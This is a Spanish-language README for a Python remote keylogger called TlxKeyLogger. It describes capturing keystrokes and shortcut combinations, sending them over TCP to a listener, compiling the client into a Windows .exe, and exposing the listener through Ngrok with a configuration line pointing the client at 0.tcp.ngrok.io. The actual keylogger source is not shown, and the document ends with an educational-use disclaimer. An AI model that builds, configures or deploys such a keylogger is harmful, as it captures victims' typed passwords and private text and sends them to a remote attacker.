# TlxKeyLogger

Este es un keylogger remoto llamado "TlxKeyLogger" desarrollado en Python. El sistema consiste en un cliente keylogger que captura las pulsaciones del teclado y las envía a través de una conexión de red a un servidor que recibe y muestra los datos en tiempo real.

## Características

- Captura de teclas en tiempo real
- Transmisión de datos por red TCP
- Soporte completo para caracteres UTF-8 (ñ, á, é, í, ó, ú, etc.)
- Detección de combinaciones de teclas (Ctrl+C, Ctrl+V, Alt+Tab, etc.)
- Compilación a archivo .exe para Windows
- Interfaz de usuario interactiva con colores
- Registro de logs en formato texto y JSON
- Soporte para conexión remota via Ngrok

## Instalación

```bash
# Clonar el repositorio
git clone https://github.com/agk-tlanex/tlxkeylog
```
```bash
cd tlxkeylog
```
```bash
# Instalar dependencias
pip install -r requirements.txt
```
```bash
# Ejecuta
python main.py
```

## Uso
# 1. Configurar el servidor
Edita utils/listener.py para cambiar el puerto si es necesario:

```python
def ListenServer(dPort=4444):
    # Cambia 4444 por el puerto deseado
```
# 2. Configurar el cliente
Edita utils/tlxkeylog.py para establecer la IP y el puerto del servidor:

```python
start(dIP="TU_IP", dPort=4444)
```

# 3. Ejecutar el programa
```bash
python main.py
```
# 4. Menú de opciones
- Opción 1 : Iniciar servidor para recibir datos del keylogger
- Opción 2 : compilar el keylogger en un archivo .exe
- Opción 3 : Ver créditos del proyecto
- Opción 0 : Salir del programa

 ## Compilación a EXE
El proyecto incluye un compilador integrado para generar archivos ejecutables:

Selecciona la opción 2 del menú principal
Ingresa un nombre para el archivo (mínimo 5 caracteres)
El archivo .exe se generará en dist/

## Uso Remoto
# Para acceso remoto, puedes usar Ngrok:
```bash
# Exponer el puerto local
ngrok tcp 4444
```
# Usar la URL proporcionada por Ngrok en tlxkeylog.py
```python
start(dIP="0.tcp.ngrok.io", dPort=12345)
```

## Estructura del Proyecto
```bash
tlxkeylogger/
├── main.py              # Interfaz principal
├── utils/
│   ├── listener.py      # Servidor receptor
│   ├── tlxkeylog.py     # Cliente keylogger
│   ├── compiler.py      # Compilador a EXE
│   ├── banners.py       # Banners y arte ASCII
│   └── printcolor.py    # Utilidades de color
├── requirements.txt     # Dependencias
└── README.md           # Este archivo
```
## Advertencia
Esta herramienta está diseñada para fines educativos y de pruebas de seguridad. El uso no autorizado de keyloggers en sistemas ajenos es ilegal. Utiliza esta herramienta responsablemente y solo en sistemas que te pertenezcan o con permiso explícito.
